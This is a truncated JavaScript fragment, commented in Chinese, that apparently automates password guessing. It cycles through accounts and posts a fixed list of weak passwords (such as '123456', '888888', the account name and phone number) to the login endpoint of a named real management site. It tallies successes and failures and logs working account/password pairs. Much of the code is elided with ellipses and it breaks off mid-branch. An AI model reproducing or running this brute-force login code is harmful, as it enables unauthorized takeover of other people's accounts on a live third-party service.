                                            ...
                                            (function getNextAccount(allLen){
                                                if(allLen >= listChannel){
                                                    ...
                                                    let
                                                        ...
                                                        passwords = [`123456`,`1234567`,`12345678`,thisAccount,phone,`654321`,`7654321`,`123321`,`123456789`,`888888`],
                                                        // 退出当前账号代码
													...
													if(!that.load.option.accountFail){
														that.load.option.accountFail = 0;
													}
													if(!that.load.option.accountNo){
														that.load.option.accountNo = 0;
													}
													if(!that.load.option.accountOk){
														that.load.option.accountOk = 0;
													}
													
                                                    (function checkLogin(len){
                                                        if(len >= passwords.length){
															if(accountNo == passwords.length){
																that.load.option.accountNo++;
																//that.load.module.console.alert(`第 ${allLen+1} 阶段 / 总 ${listChannel} / 密码错误 ${that.load.option.accountNo} / 登陆失败 ${that.load.option.accountFail} ....`,false);
															}
                                                            ...
                                                            ;
															that.load.module.console.alert(`第 ${allLen+1} 阶段 / 总 ${listChannel} / 登陆成功 ${that.load.option.accountOk} / 密码错误 ${that.load.option.accountNo} / 登陆失败 ${that.load.option.accountFail} ....`,false);
                                                            ...
                                                            that.load.eles.$.post(`http://manager.hzkunhang.com/system/user/login.htm`,postObject,(data)=>{
                                                                ...
                                                                if(code === 200){
																	...
																	accountNo ++;
																	console.log(accountNo,thisAccount,thisPassword);
                                                                    checkLogin(++len);
                                                                }else{
																	that.load.option.accountFail++;
